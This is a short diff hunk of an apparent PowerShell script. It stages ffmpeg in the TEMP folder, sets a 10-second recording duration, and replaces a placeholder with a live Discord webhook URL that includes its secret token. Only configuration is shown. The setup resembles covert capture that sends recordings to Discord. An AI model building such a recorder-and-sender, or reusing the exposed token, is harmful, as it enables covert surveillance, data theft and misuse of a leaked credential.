@@ -2,7 +2,7 @@
 $ffmpegUrl = "https://ffmpeg.org/releases/ffmpeg-release-full.7z"
 $ffmpegFolder = "$env:TEMP\ffmpeg"
 $ffmpegPath = "$ffmpegFolder\bin\ffmpeg.exe"
-$webhookUrl = "YOUR_DISCORD_WEBHOOK_URL" # Replace with your Discord webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1279782310341775463/tUSoz4kMon0fVjx62uPcoeMnqhsyW3G1ISog6C_rmxfkZSKPCxJWJcJVmhuarVV4bArg" # Replace with your Discord webhook URL
 $duration = 10 # Duration in seconds
 
 # 7-Zip Installer
